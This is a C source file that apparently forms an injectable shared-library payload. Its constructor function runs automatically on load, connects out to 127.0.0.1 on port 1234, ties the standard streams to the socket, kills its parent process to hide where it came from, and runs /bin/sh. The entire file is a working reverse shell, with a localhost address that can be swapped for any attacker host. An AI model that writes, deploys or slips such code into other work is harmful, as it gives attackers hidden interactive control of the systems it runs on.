#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

#define port 1234
#define addr "127.0.0.1"

void __attribute__((constructor)) reverse_shell(){ 
  int socket_fd;
  int pid;
  struct sockaddr_in server;  

  // set up socket for connection
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = inet_addr(addr);

  // loop until connection is established
  while( connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr)) != 0){
    usleep(500000);
  }

  // fork process && copy stdin, stdout & stderr to client socket
  if((pid = fork()) == 0){
    dup2(socket_fd,0);
    dup2(socket_fd,1);
    dup2(socket_fd,2);
    kill(getppid(), SIGKILL); // kill parent process to hide who spawned shell 
    execve("/bin/sh", NULL, NULL); // start shell
  }else{
    wait(NULL);
  }
}
